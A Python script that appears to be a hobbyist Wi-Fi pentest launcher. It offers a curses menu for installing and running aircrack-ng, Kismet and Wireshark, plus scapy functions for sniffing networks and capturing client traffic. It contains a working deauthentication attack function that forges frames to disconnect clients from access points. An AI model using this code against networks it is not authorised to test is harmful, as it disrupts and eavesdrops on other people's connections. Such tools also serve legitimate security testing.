# Disclaimer this tool are fully coding by h22n.
import os
import sys
import curses
import subprocess
import time
import threading
from scapy.all import *

# Store access points and clients
access_points = {}
clients = []

# Define a directory to store captured packets and logs
capture_dir = "captures"
log_file = "tool.log"
if not os.path.exists(capture_dir):
    os.makedirs(capture_dir)

def log_message(message):
    """Log messages to a file."""
    with open(log_file, "a") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def list_wifi_interfaces():
    """List all available Wi-Fi interfaces."""
    try:
        interfaces = os.popen("iw dev | grep Interface | awk '{print $2}'").read().split()
        return interfaces
    except Exception as e:
        log_message(f"Error listing Wi-Fi interfaces: {e}")
        return []

def set_monitor_mode(interface):
    """Set a given interface to monitor mode."""
    try:
        print(f"Setting {interface} to monitor mode...")
        log_message(f"Setting {interface} to monitor mode")
        os.system(f"sudo ip link set {interface} down")
        os.system(f"sudo iw dev {interface} set type monitor")
        os.system(f"sudo ip link set {interface} up")
    except Exception as e:
        log_message(f"Error setting {interface} to monitor mode: {e}")

def packet_handler(pkt, interface):
    """Handle sniffed packets and display APs and Clients."""
    if pkt.haslayer(Dot11Beacon):
        ssid = pkt[Dot11Elt].info.decode(errors="ignore")
        bssid = pkt[Dot11].addr3
        if bssid not in access_points:
            access_points[bssid] = ssid
            print(f"Interface {interface}: Access Point Found: SSID: {ssid}, BSSID: {bssid}")
    
    if pkt.haslayer(Dot11) and pkt.type == 2:  # Data frame
        if pkt.addr1 and pkt.addr2:
            if pkt.addr1 not in clients:
                clients.append(pkt.addr1)
                print(f"Interface {interface}: Client Found: {pkt.addr1}")

def start_sniffing(interface):
    """Start sniffing on a given interface."""
    try:
        print(f"Sniffing on interface {interface}...")
        log_message(f"Starting sniffing on {interface}")
        sniff(iface=interface, prn=lambda pkt: packet_handler(pkt, interface), store=0, timeout=30)
    except Exception as e:
        log_message(f"Error sniffing on {interface}: {e}")

def deauth_attack(target_mac, ap_mac, interface, count=100):
    """Send deauthentication frames to disconnect a client from an AP."""
    try:
        dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        print(f"Sending Deauth packets to {target_mac} from {ap_mac}")
        log_message(f"Sending Deauth packets to {target_mac} from {ap_mac}")
        sendp(packet, iface=interface, count=count, inter=.1)
    except Exception as e:
        log_message(f"Error sending deauth packets: {e}")

def capture_traffic(ap_mac, client_mac, interface, filename="capture.pcap"):
    """Capture traffic between an AP and client and save to a file."""
    try:
        print(f"Starting packet capture for traffic between {client_mac} and {ap_mac}...")
        capture_filter = f"wlan addr1 {client_mac} or wlan addr2 {client_mac}"
        packets = sniff(iface=interface, filter=capture_filter, timeout=30)
        filepath = os.path.join(capture_dir, filename)
        wrpcap(filepath, packets)
        print(f"Packets captured and saved to {filepath}")

        if os.system("which tshark") == 0:
            print(f"Analyzing capture with TShark: {filepath}")
            os.system(f"tshark -r {filepath} -V")
    except Exception as e:
        log_message(f"Error capturing traffic: {e}")

def check_tool_installed(tool):
    """Check if a given tool is installed."""
    return subprocess.call(f"which {tool} > /dev/null 2>&1", shell=True) == 0

def install_tool(tool, package):
    """Install a tool using package manager."""
    try:
        print(f"🛠️ Installing {tool}...")
        log_message(f"Installing {tool}")
        if os.path.isfile('/etc/alpine-release'):
            os.system(f"apk add {package}")
        elif os.path.isfile('/etc/arch-release'):
            os.system(f"pacman -Syu --noconfirm {package}")
        else:
            os.system(f"sudo apt-get install -y {package}")
    except Exception as e:
        log_message(f"Error installing {tool}: {e}")

def show_loading_animation(stdscr, message="Loading..."):
    """Show an anime-style loading animation."""
    stdscr.clear()
    h, w = stdscr.getmaxyx()
    animation = ['⠙⠲⠤⠴⠒', '⠤⠴⠙⠲⠤', '⠲⠤⠴⠒⠁', '⠴⠒⠙⠲⠤']
    
    for i in range(20):  # Animation duration
        stdscr.clear()
        stdscr.addstr(h//2, w//2 - len(message)//2, message)
        stdscr.addstr(h//2 + 1, w//2 - len(animation[i % len(animation)])//2, animation[i % len(animation)])
        stdscr.refresh()
        time.sleep(0.2)

def menu(stdscr):
    """Display a menu and handle user selection using curses."""
    options = [
        "Aircrack-ng",
        "Kismet",
        "Wireshark",
        "TShark",
        "Start Monitoring",
        "Exit"
    ]
    
    current_option = 0

    while True:
        stdscr.clear()
        h, w = stdscr.getmaxyx()
        for idx, option in enumerate(options):
            x = w//2 - len(option)//2
            y = h//2 - len(options)//2 + idx
            if idx == current_option:
                stdscr.attron(curses.A_REVERSE)
            stdscr.addstr(y, x, option)
            if idx == current_option:
                stdscr.attroff(curses.A_REVERSE)
        stdscr.refresh()
        
        key = stdscr.getch()
        
        if key == curses.KEY_UP:
            current_option = (current_option - 1) % len(options)
        elif key == curses.KEY_DOWN:
            current_option = (current_option + 1) % len(options)
        elif key == 10:  # Enter key
            choice = options[current_option]
            if choice == "Exit":
                break
            handle_tool_choice(choice, stdscr)
    
def handle_tool_choice(choice, stdscr):
    """Handle the user's tool choice."""
    tool = {
        "Aircrack-ng": "aircrack-ng",
        "Kismet": "kismet",
        "Wireshark": "wireshark",
        "TShark": "tshark"
    }.get(choice)
    package = {
        "Aircrack-ng": "aircrack-ng",
        "Kismet": "kismet",
        "Wireshark": "wireshark",
        "TShark": "tshark"
    }.get(choice)
    
    if tool:
        if not check_tool_installed(tool):
            stdscr.clear()
            stdscr.addstr(0, 0, f"{tool} is not installed.")
            stdscr.addstr(1, 0, f"Would you like to install {tool}? (y/n): ")
            stdscr.refresh()
            install = stdscr.getstr().decode().lower()
            if install == "y":
                show_loading_animation(stdscr, f"Installing {tool}...")
                install_tool(tool, package)
            else:
                stdscr.clear()
                stdscr.addstr(0, 0, "📦 Installation skipped.")
                stdscr.refresh()
                time.sleep(2)
        else:
            stdscr.clear()
            stdscr.addstr(0, 0, f"{tool} is already installed.")
            stdscr.refresh()
            time.sleep(2)
        
        stdscr.clear()
        stdscr.addstr(0, 0, f"Would you like to use {tool}? (y/n): ")
        stdscr.refresh()
        use_tool = stdscr.getstr().decode().lower()
        if use_tool == "y":
            stdscr.clear()
            stdscr.addstr(0, 0, f"Launching {tool}...")
            stdscr.refresh()
            time.sleep(2)
            os.system(f"{tool} &")
        else:
            stdscr.clear()
            stdscr.addstr(0, 0, "🚫 Operation canceled.")
            stdscr.refresh()
            time.sleep(2)

def main():
    """Main function to run the curses menu."""
    if os.geteuid() != 0:
        print("❗ Please run this script as root!")
        exit(1)
    
    curses.wrapper(menu)

if __name__ == "__main__":
    main()
                   
